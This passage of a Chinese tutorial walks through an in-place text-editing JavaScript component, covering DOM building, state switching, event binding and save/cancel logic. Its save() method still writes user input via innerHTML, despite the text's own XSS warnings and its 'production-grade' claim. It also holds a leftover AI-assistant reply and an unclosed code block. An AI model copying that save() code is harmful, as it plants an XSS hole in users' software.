<li>建立父子关系：<code>staticElement.parentNode === containerElement</code></li>
<li>若父元素已在页面上，则子元素<strong>立即显示</strong></li>
</ul>
<blockquote>
<p>⚠️ 注意：<code>appendChild</code> 是 <strong>“移动”而非“复制”</strong> ，一个 DOM 节点只能存在于一处。</p>
</blockquote>
<hr/>
<h4 data-id="heading-6">🔹 3. <code>this.value</code> 到底是什么？何时变化？</h4>
<p>这是整个组件的<strong>灵魂</strong>。它的生命周期如下：</p>



































<table><thead><tr><th>阶段</th><th><code>this.value</code> 的值</th><th>是否更新？</th></tr></thead><tbody><tr><td>构造时</td><td>用户传入值，或默认提示语</td><td>✅ 初始化</td></tr><tr><td>显示文本</td><td>用于 <code>staticElement.textContent</code></td><td>❌ 只读</td></tr><tr><td>进入编辑</td><td>用于 <code>fieldElement.value</code></td><td>❌ 只读</td></tr><tr><td>点击保存</td><td>更新为 <code>fieldElement.value</code></td><td>✅ <strong>唯一更新点</strong></td></tr><tr><td>点击取消</td><td><strong>保持不变</strong></td><td>❌ 不更新</td></tr></tbody></table>
<blockquote>
<p>✅ <strong>设计原则</strong>：</p>
<ul>
<li>“取消”不修改数据</li>
<li>“保存”才同步草稿到正式数据</li>
<li>每次编辑都从 <code>this.value</code> 重置输入框，避免残留</li>
</ul>
</blockquote>
<hr/>
<h4 data-id="heading-7">🔹 4. 为什么用 <code>textContent</code> 而不是 <code>innerHTML</code>？</h4>
<pre><code class="hljs language-ini" lang="ini">// ✅ 安全做法
<span class="hljs-attr">this.staticElement.textContent</span> = this.value<span class="hljs-comment">;</span>

// ❌ 危险做法（除非你完全信任内容）<span class="hljs-attr">this.staticElement.innerHTML</span> = this.value<span class="hljs-comment">;</span>
</code></pre>
<ul>
<li><code>innerHTML</code> 会<strong>解析 HTML</strong>，若 <code>value</code> 包含 <code>&lt;script&gt;</code> 或 <code>&lt;img onerror&gt;</code>，可能引发 XSS 攻击</li>
<li><code>textContent</code> 将内容视为<strong>纯文本</strong>，自动转义尖括号，绝对安全</li>
</ul>
<blockquote>
<p>🛡️ <strong>安全第一</strong>：除非明确需要富文本，否则永远优先使用 <code>textContent</code>。</p>
</blockquote>
<hr/>
<h4 data-id="heading-8">🔹 5. 事件绑定中的箭头函数为何关键？</h4>
<pre><code class="hljs language-js" lang="js"><span class="hljs-variable language_">this</span>.<span class="hljs-property">staticElement</span>.<span class="hljs-title function_">addEventListener</span>(<span class="hljs-string">'click'</span>, <span class="hljs-function">() =&gt;</span> {
    <span class="hljs-variable language_">this</span>.<span class="hljs-title function_">convertToField</span>(); <span class="hljs-comment">// ✅ this 指向 EditInPlace 实例</span>
});
</code></pre>
<p>若使用普通函数：</p>
<pre><code class="hljs language-js" lang="js"><span class="hljs-variable language_">this</span>.<span class="hljs-property">staticElement</span>.<span class="hljs-title function_">addEventListener</span>(<span class="hljs-string">'click'</span>, <span class="hljs-keyword">function</span>(<span class="hljs-params"/>) {
    <span class="hljs-variable language_">this</span>.<span class="hljs-title function_">convertToField</span>(); <span class="hljs-comment">// ❌ this 指向 staticElement，报错！</span>
});
</code></pre>
<ul>
<li>普通函数中，<code>this</code> 由调用方式决定，事件回调中指向触发元素</li>
<li>箭头函数<strong>没有自己的 <code>this</code></strong>，继承外层作用域（即构造函数中的 <code>this</code>）</li>
</ul>
<blockquote>
<p>💡 这是 JavaScript 中经典的 <strong>“this 丢失”问题</strong>，箭头函数是最简洁的解决方案。</p>
</blockquote>
<hr/>
<h4 data-id="heading-9">🔹 ### <code>save()</code> 与 <code>cancel()</code>：保存确认 vs 安全回退</h4>
<p>在就地编辑组件中， <strong>“保存”和“取消”看似对称，实则职责迥异</strong>。它们共同构成了用户编辑操作的闭环，但内部逻辑却体现了截然不同的数据处理原则。</p>
<p>我们先看 <code>save</code> 方法：</p>
<pre><code class="hljs language-js" lang="js"><span class="hljs-attr">save</span>: <span class="hljs-keyword">function</span>(<span class="hljs-params"/>) {
    <span class="hljs-keyword">var</span> value = <span class="hljs-variable language_">this</span>.<span class="hljs-property">fieldElement</span>.<span class="hljs-property">value</span>; <span class="hljs-comment">// 读取当前输入框中的用户输入</span>
    <span class="hljs-comment">// fetch后端存储（实际项目中应在此发送异步请求）</span>
    <span class="hljs-variable language_">this</span>.<span class="hljs-property">value</span> = value;                  <span class="hljs-comment">// 更新核心数据</span>
    <span class="hljs-variable language_">this</span>.<span class="hljs-property">staticElement</span>.<span class="hljs-property">innerHTML</span> = value; <span class="hljs-comment">// 更新显示值</span>
    <span class="hljs-variable language_">this</span>.<span class="hljs-title function_">convertToText</span>();                <span class="hljs-comment">// 切换回文本显示状态</span>
},
</code></pre>
<ul>
<li><strong>第1行</strong>：从输入框获取用户输入的新内容，存入局部变量 <code>value</code>。</li>
<li><strong>关键赋值</strong>：<code>this.value = value</code> —— 这是整个组件中<strong>唯一更新核心数据的地方</strong>。<br/>
<code>this.value</code> 是组件的“唯一真实数据源”，所有视图都基于它渲染。</li>
<li><strong>视图同步</strong>：通过 <code>innerHTML</code> 将新值写入 <code>&lt;span&gt;</code>，确保只读状态下显示最新内容。<br/>
⚠️ <strong>安全提醒</strong>：若内容不可信，建议改用 <code>textContent</code> 防止 XSS。</li>
<li><strong>状态切换</strong>：调用 <code>convertToText()</code> 隐藏编辑控件，回归简洁展示。</li>
</ul>
<p>再看 <code>cancel</code> 方法：</p>
<pre><code class="hljs language-js" lang="js"><span class="hljs-attr">cancel</span>: <span class="hljs-keyword">function</span>(<span class="hljs-params"/>) {
    <span class="hljs-variable language_">this</span>.<span class="hljs-title function_">convertToText</span>(); <span class="hljs-comment">// 仅切换到文本显示状态</span>
}
</code></pre>
<ul>
<li>
<p><strong>极其简洁</strong>：它<strong>不做任何数据操作</strong>，只调用 <code>convertToText()</code>。</p>
</li>
<li>
<p><strong>设计精髓</strong>：</p>
<ul>
<li>不修改 <code>this.value</code> → 保留上一次确认的内容</li>
<li>不更新 <code>&lt;span&gt;</code> → 视图自然保持原样</li>
<li>下次进入编辑时，<code>convertToField()</code> 会用 <code>this.value</code> 重置输入框，<strong>自动丢弃草稿</strong></li>
</ul>
</li>
</ul>
<blockquote>
<p>✅ <strong>核心差异总结</strong>：</p>























<table><thead><tr><th>方法</th><th>是否修改 <code>this.value</code></th><th>是否更新视图内容</th><th>用户意图</th></tr></thead><tbody><tr><td><code>save()</code></td><td>✅ 是</td><td>✅ 是</td><td>“我要保留这个修改”</td></tr><tr><td><code>cancel()</code></td><td>❌ 否</td><td>❌ 否</td><td>“我不改了，恢复原样”</td></tr></tbody></table>
</blockquote>
<p>这种设计完美契合用户心理预期：</p>
<ul>
<li>点“保存” → 内容永久生效</li>
<li>点“取消” → 一切如初，仿佛从未编辑</li>
</ul>
<hr/>
<h3 data-id="heading-10">四、完整功能实现</h3>
<p>当然可以！以下是对 <strong>“四、完整功能实现”</strong> 章节的<strong>全面润色与深度完善版</strong>。在保留你原有代码结构的基础上，我增加了：</p>
<ul>
<li>每个方法的<strong>设计目标与职责说明</strong></li>
<li>关键行的<strong>逐行注释解析</strong></li>
<li>相关的<strong>前端核心知识点</strong></li>
<li><strong>安全、性能、可维护性</strong>的最佳实践建议</li>
<li>以及对潜在问题的<strong>防御性编程思考</strong></li>
</ul>
<hr/>
<h3 data-id="heading-11">四、完整功能实现 —— 从骨架到血肉</h3>
<p>一个健壮的组件，不仅要有正确的逻辑，更要有清晰的职责划分和工程意识。下面我们将 <code>EditInPlace</code> 的核心方法按功能模块拆解，逐层讲解其背后的设计哲学。</p>
<hr/>
<h4 data-id="heading-12">🧱 1. 创建 DOM 结构：构建组件的“物理载体”</h4>
<pre><code class="hljs language-js" lang="js"><span class="hljs-title function_">createElement</span>(<span class="hljs-params"/>) {
    <span class="hljs-comment">// 创建外层容器，作为组件的根节点</span>
    <span class="hljs-variable language_">this</span>.<span class="hljs-property">containerElement</span> = <span class="hljs-variable language_">document</span>.<span class="hljs-title function_">createElement</span>(<span class="hljs-string">'div'</span>);
    <span class="hljs-variable language_">this</span>.<span class="hljs-property">containerElement</span>.<span class="hljs-property">id</span> = <span class="hljs-variable language_">this</span>.<span class="hljs-property">id</span>; <span class="hljs-comment">// 便于调试或外部选中</span>

    <span class="hljs-comment">// === 文本显示区（只读状态）===</span>
    <span class="hljs-variable language_">this</span>.<span class="hljs-property">staticElement</span> = <span class="hljs-variable language_">document</span>.<span class="hljs-title function_">createElement</span>(<span class="hljs-string">'span'</span>);<span class="hljs-comment">//创建一个&lt;span&gt;元素</span>
        <span class="hljs-comment">// ✅ 使用 textContent 而非 innerHTML，防止 XSS 攻击</span>
    <span class="hljs-variable language_">this</span>.<span class="hljs-property">staticElement</span>.<span class="hljs-property">textContent</span> = <span class="hljs-variable language_">this</span>.<span class="hljs-property">value</span>;
    <span class="hljs-variable language_">this</span>.<span class="hljs-property">containerElement</span>.<span class="hljs-title function_">appendChild</span>(<span class="hljs-variable language_">this</span>.<span class="hljs-property">staticElement</span>); <span class="hljs-comment">//将刚创建的 &lt;span&gt; 添加为 &lt;div&gt; 的子节点</span>

    <span class="hljs-comment">// === 编辑输入区（编辑状态）===</span>
    <span class="hljs-variable language_">this</span>.<span class="hljs-property">fieldElement</span> = <span class="hljs-variable language_">document</span>.<span class="hljs-title function_">createElement</span>(<span class="hljs-string">'input'</span>);
        <span class="hljs-comment">// 创建&lt;input&gt;元素用于用户输入，并将其引用保存到 this.fieldElement，</span>
        <span class="hljs-comment">// 便于后续读取值、聚焦及控制显示/隐藏等操作。</span>
    <span class="hljs-variable language_">this</span>.<span class="hljs-property">fieldElement</span>.<span class="hljs-property">type</span> = <span class="hljs-string">'text'</span>;
    <span class="hljs-variable language_">this</span>.<span class="hljs-property">fieldElement</span>.<span class="hljs-property">value</span> = <span class="hljs-variable language_">this</span>.<span class="hljs-property">value</span>;
        <span class="hljs-comment">//将当前组件的值（this.value）同步到输入框中，作为编辑的起点 </span>
        <span class="hljs-comment">//确保用户点击编辑时，看到的是最新内容，而非空框。</span>
    <span class="hljs-variable language_">this</span>.<span class="hljs-property">containerElement</span>.<span class="hljs-title function_">appendChild</span>(<span class="hljs-variable language_">this</span>.<span class="hljs-property">fieldElement</span>);
       <span class="hljs-comment">//将输入框添加为容器的子节点，成为 DOM 树的一部分</span>

    <span class="hljs-comment">// === 功能按钮（语义化 &amp; 可访问性）===</span>
    <span class="hljs-variable language_">this</span>.<span class="hljs-property">saveButton</span> = <span class="hljs-variable language_">document</span>.<span class="hljs-title function_">createElement</span>(<span class="hljs-string">'button'</span>);
    <span class="hljs-variable language_">this</span>.<span class="hljs-property">saveButton</span>.<span class="hljs-property">textContent</span> = <span class="hljs-string">'保存'</span>;
    <span class="hljs-comment">// 可选：添加 type="button" 防止表单意外提交</span>
    <span class="hljs-variable language_">this</span>.<span class="hljs-property">saveButton</span>.<span class="hljs-property">type</span> = <span class="hljs-string">'button'</span>;
    <span class="hljs-variable language_">this</span>.<span class="hljs-property">containerElement</span>.<span class="hljs-title function_">appendChild</span>(<span class="hljs-variable language_">this</span>.<span class="hljs-property">saveButton</span>);

    <span class="hljs-variable language_">this</span>.<span class="hljs-property">cancelButton</span> = <span class="hljs-variable language_">document</span>.<span class="hljs-title function_">createElement</span>(<span class="hljs-string">'button'</span>);
    <span class="hljs-variable language_">this</span>.<span class="hljs-property">cancelButton</span>.<span class="hljs-property">textContent</span> = <span class="hljs-string">'取消'</span>;
    <span class="hljs-variable language_">this</span>.<span class="hljs-property">cancelButton</span>.<span class="hljs-property">type</span> = <span class="hljs-string">'button'</span>;
    <span class="hljs-variable language_">this</span>.<span class="hljs-property">containerElement</span>.<span class="hljs-title function_">appendChild</span>(<span class="hljs-variable language_">this</span>.<span class="hljs-property">cancelButton</span>);

    <span class="hljs-comment">// === 挂载到页面 ===</span>
    <span class="hljs-comment">// 将整个组件子树插入用户指定的父容器</span>
    <span class="hljs-variable language_">this</span>.<span class="hljs-property">parentElement</span>.<span class="hljs-title function_">appendChild</span>(<span class="hljs-variable language_">this</span>.<span class="hljs-property">containerElement</span>);

    <span class="hljs-comment">// 初始化为只读状态（隐藏编辑控件）</span>
    <span class="hljs-variable language_">this</span>.<span class="hljs-title function_">convertToText</span>();
}
</code></pre>
<h5 data-id="heading-13">🔍 <strong>关键知识点</strong></h5>
<ul>
<li><strong>DOM 树构建</strong>：所有元素在内存中创建后一次性挂载，减少重排（reflow）。</li>
<li><strong>语义化 HTML</strong>：<code>&lt;button&gt;</code> 自带键盘可聚焦、屏幕阅读器支持，优于 <code>&lt;div&gt;</code>。</li>
<li><strong>安全默认</strong>：<code>textContent</code> 自动转义 HTML 特殊字符，是防 XSS 的第一道防线。</li>
<li><strong>ID 唯一性</strong>：<code>this.id</code> 应由调用者保证唯一，避免冲突（生产中建议加前缀如 <code>eip-${id}</code>）。</li>
</ul>
<hr/>
<h4 data-id="heading-14">🔄 2. 状态切换：管理“视图模式”的核心引擎</h4>
<pre><code class="hljs language-js" lang="js"><span class="hljs-comment">// 切换到只读文本状态</span>
<span class="hljs-title function_">convertToText</span>(<span class="hljs-params"/>) {
    <span class="hljs-comment">// 隐藏所有编辑相关元素</span>
    <span class="hljs-variable language_">this</span>.<span class="hljs-property">fieldElement</span>.<span class="hljs-property">style</span>.<span class="hljs-property">display</span> = <span class="hljs-string">'none'</span>;
    <span class="hljs-variable language_">this</span>.<span class="hljs-property">saveButton</span>.<span class="hljs-property">style</span>.<span class="hljs-property">display</span> = <span class="hljs-string">'none'</span>;
    <span class="hljs-variable language_">this</span>.<span class="hljs-property">cancelButton</span>.<span class="hljs-property">style</span>.<span class="hljs-property">display</span> = <span class="hljs-string">'none'</span>;
    
    <span class="hljs-comment">// 显示静态文本</span>
    <span class="hljs-variable language_">this</span>.<span class="hljs-property">staticElement</span>.<span class="hljs-property">style</span>.<span class="hljs-property">display</span> = <span class="hljs-string">'inline'</span>; 
}

<span class="hljs-comment">// 切换到可编辑状态</span>
<span class="hljs-title function_">convertToField</span>(<span class="hljs-params"/>) {
    <span class="hljs-comment">// 隐藏静态文本</span>
    <span class="hljs-variable language_">this</span>.<span class="hljs-property">staticElement</span>.<span class="hljs-property">style</span>.<span class="hljs-property">display</span> = <span class="hljs-string">'none'</span>;
    
    <span class="hljs-comment">// 同步数据到输入框（关键！确保每次编辑都基于最新已保存值）</span>
    <span class="hljs-variable language_">this</span>.<span class="hljs-property">fieldElement</span>.<span class="hljs-property">value</span> = <span class="hljs-variable language_">this</span>.<span class="hljs-property">value</span>;
    
    <span class="hljs-comment">// 显示编辑控件</span>
    <span class="hljs-variable language_">this</span>.<span class="hljs-property">fieldElement</span>.<span class="hljs-property">style</span>.<span class="hljs-property">display</span> = <span class="hljs-string">'inline'</span>;
    <span class="hljs-variable language_">this</span>.<span class="hljs-property">saveButton</span>.<span class="hljs-property">style</span>.<span class="hljs-property">display</span> = <span class="hljs-string">'inline'</span>;
    <span class="hljs-variable language_">this</span>.<span class="hljs-property">cancelButton</span>.<span class="hljs-property">style</span>.<span class="hljs-property">display</span> = <span class="hljs-string">'inline'</span>;
    
    <span class="hljs-comment">// 自动聚焦 + 全选（提升用户体验）</span>
    <span class="hljs-variable language_">this</span>.<span class="hljs-property">fieldElement</span>.<span class="hljs-title function_">focus</span>();
    <span class="hljs-variable language_">this</span>.<span class="hljs-property">fieldElement</span>.<span class="hljs-title function_">select</span>(); <span class="hljs-comment">// 可选：全选文本，方便快速覆盖</span>
}
</code></pre>
<h5 data-id="heading-15">🔍 <strong>关键知识点</strong></h5>
<ul>
<li><strong>状态驱动视图</strong>：组件只有两种互斥状态（编辑 / 只读），通过显隐控制切换。</li>
<li><strong>数据一致性保障</strong>：<code>this.fieldElement.value = this.value</code> 确保输入框始终反映<strong>已确认的数据</strong>，而非残留草稿。</li>
<li><strong>用户体验细节</strong>：<code>focus()</code> 让用户无需再点一次输入框；<code>select()</code> 适合“标语类”短文本场景。</li>
</ul>
<blockquote>
<p>⚠️ <strong>为什么不直接删除/重建 DOM？</strong><br/>
频繁创建/销毁 DOM 开销大，且会丢失焦点、事件监听器等状态。<strong>复用 + 显隐</strong> 是更高效、稳定的方案。</p>
</blockquote>
<hr/>
<h4 data-id="heading-16">⚡ 3. 事件绑定：连接用户行为与组件逻辑的桥梁</h4>
<pre><code class="hljs language-js" lang="js"><span class="hljs-title function_">attachEvent</span>(<span class="hljs-params"/>) {
    <span class="hljs-comment">// 点击静态文本 → 进入编辑模式</span>
    <span class="hljs-variable language_">this</span>.<span class="hljs-property">staticElement</span>.<span class="hljs-title function_">addEventListener</span>(<span class="hljs-string">'click'</span>, <span class="hljs-function">() =&gt;</span> {
        <span class="hljs-variable language_">this</span>.<span class="hljs-title function_">convertToField</span>();
    });

    <span class="hljs-comment">// 点击“保存” → 触发保存逻辑</span>
    <span class="hljs-variable language_">this</span>.<span class="hljs-property">saveButton</span>.<span class="hljs-title function_">addEventListener</span>(<span class="hljs-string">'click'</span>, <span class="hljs-function">() =&gt;</span> {
        <span class="hljs-variable language_">this</span>.<span class="hljs-title function_">save</span>();
    });

    <span class="hljs-comment">// 点击“取消” → 放弃修改，回到只读状态</span>
    <span class="hljs-variable language_">this</span>.<span class="hljs-property">cancelButton</span>.<span class="hljs-title function_">addEventListener</span>(<span class="hljs-string">'click'</span>, <span class="hljs-function">() =&gt;</span> {
        <span class="hljs-variable language_">this</span>.<span class="hljs-title function_">cancel</span>();
    });
</code></pre>
<h5 data-id="heading-17">🔍 <strong>关键知识点</strong></h5>
<ul>
<li><strong>箭头函数解决 <code>this</code> 绑定问题</strong>：<br/>
普通函数中 <code>this</code> 指向触发元素，而箭头函数继承外层作用域（即组件实例），避免 <code>this.save is not a function</code> 错误。</li>
<li><strong>事件委托 vs 直接绑定</strong>：此处元素固定且数量少，直接绑定更简单高效。</li>
<li><strong>可访问性（a11y）</strong> ：<code>&lt;button&gt;</code> 默认支持 Enter/Space 触发，已满足基础交互。</li>
</ul>
<hr/>
<h4 data-id="heading-18">💾 4. 保存逻辑：业务规则与异步处理的交汇点</h4>
<pre><code class="hljs language-js" lang="js"><span class="hljs-attr">save</span>:<span class="hljs-keyword">function</span>(<span class="hljs-params"/>){
        <span class="hljs-keyword">var</span> value = <span class="hljs-variable language_">this</span>.<span class="hljs-property">fieldElement</span>.<span class="hljs-property">value</span>; <span class="hljs-comment">//读取当前输入框中的用户输入</span>
        <span class="hljs-comment">// fetch后端存储</span>
        <span class="hljs-variable language_">this</span>.<span class="hljs-property">value</span> = value;<span class="hljs-comment">// 更新值</span>
        <span class="hljs-comment">//左边 this.value：组件内部数据属性</span>
        <span class="hljs-comment">//右边 value：上一行定义的局部变量（用户的新输入）</span>
        <span class="hljs-variable language_">this</span>.<span class="hljs-property">staticElement</span>.<span class="hljs-property">innerHTML</span> = value;<span class="hljs-comment">// 更新显示值</span>
        <span class="hljs-variable language_">this</span>.<span class="hljs-title function_">convertToText</span>();<span class="hljs-comment">// 转换到文本显示状态</span>
    },
    <span class="hljs-comment">//当用户点击“取消”按钮时，放弃当前所有未保存的修改，立即回到只读的文本显示状态。</span>
    <span class="hljs-attr">cancel</span>:<span class="hljs-keyword">function</span>(<span class="hljs-params"/>){ 
        <span class="hljs-comment">// 所有通过 new EditInPlace(...) 创建的实例都可以调用 ep.cancel()。</span>
        <span class="hljs-variable language_">this</span>.<span class="hljs-title function_">convertToText</span>();<span class="hljs-comment">// 转换到文本显示状态</span>
    }
</code></pre>
<h5 data-id="heading-19">🔍 <strong>关键知识点</strong></h5>
<ul>
<li><strong>数据一致性保障</strong>：<br/>
<code>this.value = value</code> 确保组件内部状态与用户输入同步，作为后续显示和取消操作的唯一依据。</li>
<li><strong>XSS 安全隐患</strong>：<br/>
使用 <code>innerHTML = value</code> 会直接渲染 HTML，若 <code>value</code> 包含恶意脚本（如 <code>&lt;script&gt;</code> 或事件属性），将导致 <strong>跨站脚本攻击（XSS）</strong> 。</li>
<li><strong>安全替代方案</strong>：<br/>
应优先使用 <code>textContent</code> 而非 <code>innerHTML</code>，将用户输入始终视为纯文本，自动转义特殊字符。</li>
<li><strong>无副作用的取消逻辑</strong>：<br/>
<code>cancel()</code> 仅切换视图状态，不修改 <code>this.value</code>，确保“放弃编辑”行为可预测、零风险。</li>
</ul>
<hr/>
<h4 data-id="heading-20">🚫 5. 取消逻辑：克制的优雅</h4>
<pre><code class="hljs language-js" lang="js"><span class="hljs-title function_">cancel</span>(<span class="hljs-params"/>) {
    <span class="hljs-comment">// 仅切换视图状态，不修改任何数据！</span>
    <span class="hljs-variable language_">this</span>.<span class="hljs-title function_">convertToText</span>();
}
</code></pre>
<h5 data-id="heading-21">🔍 <strong>设计哲学</strong></h5>
<ul>
<li><strong>零副作用</strong>：<code>cancel</code> 不触碰 <code>this.value</code>，确保数据始终干净。</li>
<li><strong>心理预期匹配</strong>：用户点击“取消”，期望“一切如初”，此设计完美契合。</li>
<li><strong>自动丢弃草稿</strong>：下次进入编辑时，输入框会用 <code>this.value</code> 重置，残留输入自然消失。</li>
</ul>
<blockquote>
<p>✅ <strong>这是“状态隔离”思想的典范</strong>：视图状态 ≠ 数据状态。</p>
</blockquote>
<hr/>
<h3 data-id="heading-22">五、使用示例（补充说明）</h3>
<pre><code class="hljs language-js" lang="js">&lt;div id=<span class="hljs-string">"app"</span>&gt;&lt;/div&gt;

<span class="xml"><span class="hljs-tag">&lt;<span class="hljs-name">script</span> <span class="hljs-attr">src</span>=<span class="hljs-string">"./EditInPlace.js"</span>&gt;</span><span class="hljs-tag">&lt;/<span class="hljs-name">script</span>&gt;</span></span>
<span class="xml"><span class="hljs-tag">&lt;<span class="hljs-name">script</span>&gt;</span><span class="javascript">
    <span class="hljs-comment">// 创建一个就地编辑实例</span>
    <span class="hljs-keyword">const</span> editor = <span class="hljs-keyword">new</span> <span class="hljs-title class_">EditInPlace</span>(
        <span class="hljs-string">'user-slogan'</span>,               <span class="hljs-comment">// 组件 ID（用于 container.id）</span>
        <span class="hljs-string">'欢迎来到我的主页'</span>,           <span class="hljs-comment">// 初始显示文本</span>
        <span class="hljs-variable language_">document</span>.<span class="hljs-title function_">getElementById</span>(<span class="hljs-string">'app'</span>) <span class="hljs-comment">// 挂载点</span>
    );

    <span class="hljs-comment">// 【可选】后续可通过 editor.value 读取当前值</span>
    <span class="hljs-comment">// console.log(editor.value);</span>
</span><span class="hljs-tag">&lt;/<span class="hljs-name">script</span>&gt;</span></span>
</code></pre>
<h5 data-id="heading-23">🔧 <strong>使用注意事项</strong></h5>
<ul>
<li><code>parentElement</code> 必须是<strong>已存在于 DOM 中的真实元素</strong></li>
<li>多个实例需使用<strong>不同 ID</strong>，避免冲突</li>
<li>若需动态销毁，建议后续补充 <code>destroy()</code> 方法（移除 DOM + 解绑事件）</li>
</ul>
<hr/>
<p>通过以上完善，你的 <code>EditInPlace</code> 不仅功能完整，更具备了<strong>安全性、可维护性、可扩展性</strong>，真正达到了“生产级”标准。这正是前端工程化的核心追求：<strong>用清晰的结构，解决复杂的问题</strong>。</p>
<h3 data-id="heading-24">六、总结：从组件中学到的前端核心思想</h3>

































<table><thead><tr><th>概念</th><th>本文体现</th></tr></thead><tbody><tr><td><strong>OOP 封装</strong></td><td>属性存状态，方法管行为，隐藏实现细节</td></tr><tr><td><strong>DOM 操作</strong></td><td><code>createElement</code> + <code>appendChild</code> 动态构建界面</td></tr><tr><td><strong>事件机制</strong></td><td><code>addEventListener</code> + 箭头函数解决 <code>this</code> 问题</td></tr><tr><td><strong>数据驱动</strong></td><td><code>this.value</code> 作为唯一数据源，保证一致性</td></tr><tr><td><strong>安全意识</strong></td><td>用 <code>textContent</code> 防 XSS</td></tr><tr><td><strong>用户体验</strong></td><td>自动聚焦、取消回退、无变化不保存</td></tr></tbody></table>
<blockquote>
<p>🌟 <strong>真正的工程能力，不在于会多少 API，而在于能否用清晰、安全、可维护的方式解决问题。</strong></p>
</blockquote></div></div></article> <div class="article-end" data-v-539963b4="" data-v-61fb5e44=""><div class="rank-entry-bottom" data-v-539963b4="" data-v-61fb5e44=""><!----></div> <div class="tag-list-box" data-v-539963b4="" data-v-61fb5e44=""><!----><!----><!----></div></div> <!----><!----><!----><!----><!----><style>	.markdown-body { color: #828182;}</style>]]></description></item><item>    <title><![CDATA[基于Vue3完成动态组件库建设]]></title>    <link>https://juejin.cn/post/7579832186880180274</link>    <guid>https://juejin.cn/post/7579832186880180274</guid>    <pubDate>2025-12-04T12:40:35.000Z</pubDate>    <description><![CDATA[<article itemscope="itemscope" itemtype="http://schema.org/Article" data-entry-id="7579832186880180274" data-draft-id="7579798332778102793" data-original-type="0" class="article" data-v-61fb5e44=""><!----> <meta itemprop="headline" content="基于Vue3完成动态组件库建设"/> <meta itemprop="keywords" content="前端"/> <meta itemprop="datePublished" content="2025-12-04T12:40:35.000Z"/> <meta itemprop="image" content="https://p1-jj.byteimg.com/tos-cn-i-t2oaga2asx/gold-assets/icon/icon-128.png~tplv-t2oaga2asx-image.image"/> <div itemprop="author" itemscope="itemscope" itemtype="http://schema.org/Person"><meta itemprop="name" content="Hashan"/> <meta itemprop="url" content="https://juejin.cn/user/3523276916662526"/></div> <div itemprop="publisher" itemscope="itemscope" itemtype="http://schema.org/Organization"><meta itemprop="name" content="掘金"/> <div itemprop="logo" itemscope="itemscope" itemtype="https://schema.org/ImageObject"><meta itemprop="url" content="https://p1-jj.byteimg.com/tos-cn-i-t2oaga2asx/gold-assets/icon/icon-white-180.png~tplv-t2oaga2asx-image.image"/> <meta itemprop="width" content="180"/> <meta itemprop="height" content="180"/></div></div> <h1 class="article-title" data-v-61fb5e44="">
            基于Vue3完成动态组件库建设
            <!----> <!----></h1> <div class="author-info-block block-hidden" data-v-61fb5e44=""><div class="author-info-box" data-v-61fb5e44=""><div class="author-name" data-v-61fb5e44=""><a href="/user/3523276916662526/posts" target="_blank" rel="" class="jj-link username username ellipsis" data-v-65b50b51="" data-v-292f6e48="" data-v-61fb5e44=""><span class="name" style="max-width:160px;" data-v-65b50b51="" data-v-292f6e48="">
    Hashan
  </span> <!----> <!----> <!----> </a></div> <div class="meta-box" data-v-61fb5e44=""><time datetime="2025-12-04T12:40:35.000Z" title="Thu Dec 04 2025 12:40:35 GMT+0000 (Coordinated Universal Time)" class="time" data-v-61fb5e44="">
                    2025-12-04
                  </time> <svg width="16" height="16" viewbox="0 0 16 16" fill="none" xmlns="http://www.w3.org/2000/svg" class="read-icon" data-v-61fb5e44=""><path d="M7.90078 2.80078C4.49278 2.80078 1.74745 6.11672 0.800781 7.77469C1.74745 9.58339 4.49278 13.2008 7.90078 13.2008C11.3088 13.2008 14.0541 9.58339 15.0008 7.77469C14.0541 6.11672 11.3088 2.80078 7.90078 2.80078Z" stroke="currentColor" data-v-61fb5e44=""/><circle cx="7.89922" cy="8.00078" r="2.2" stroke="currentColor" data-v-61fb5e44=""/></svg> <span class="views-count" data-v-61fb5e44="">
                    0
                  </span> <span class="read-time" data-v-61fb5e44=""><svg width="16" height="16" viewbox="0 0 16 16" fill="none" xmlns="http://www.w3.org/2000/svg" data-v-61fb5e44=""><rect width="16" height="16" fill="none" data-v-61fb5e44=""/><circle cx="8" cy="8" r="5.65625" stroke="#8A919F" data-v-61fb5e44=""/><path d="M7.69141 5.18652V8.30924H10.8141" stroke="#8A919F" stroke-linecap="round" stroke-linejoin="round" data-v-61fb5e44=""/></svg>
                    阅读9分钟
                  </span> <!----></div></div> <div style="flex:1;" data-v-61fb5e44=""/> <!----> <!----></div> <!----> <!----> <!----> <!----> <div id="article-root" itemprop="articleBody" class="main" data-v-61fb5e44=""><div class="article-viewer markdown-body result"><style>.markdown-body{color:#595959;font-size:15px;font-family:-apple-system,system-ui,BlinkMacSystemFont,Helvetica Neue,PingFang SC,Hiragino Sans GB,Microsoft YaHei,Arial,sans-serif;background-image:linear-gradient(90deg,rgba(60,10,30,.04) 3%,transparent 0),linear-gradient(1turn,rgba(60,10,30,.04) 3%,transparent 0);background-size:20px 20px;background-position:50%}.markdown-body p{color:#595959;font-size:15px;line-height:2;font-weight:400}.markdown-body p+p{margin-top:16px}.markdown-body h1,.markdown-body h2,.markdown-body h3,.markdown-body h4,.markdown-body h5,.markdown-body h6{padding:30px 0;margin:0;color:#135ce0}.markdown-body h1{position:relative;text-align:center;font-size:22px;margin:50px 0}.markdown-body h1:before{position:absolute;content:"";top:-10px;left:50%;width:32px;height:32px;transform:translateX(-50%);background-size:100% 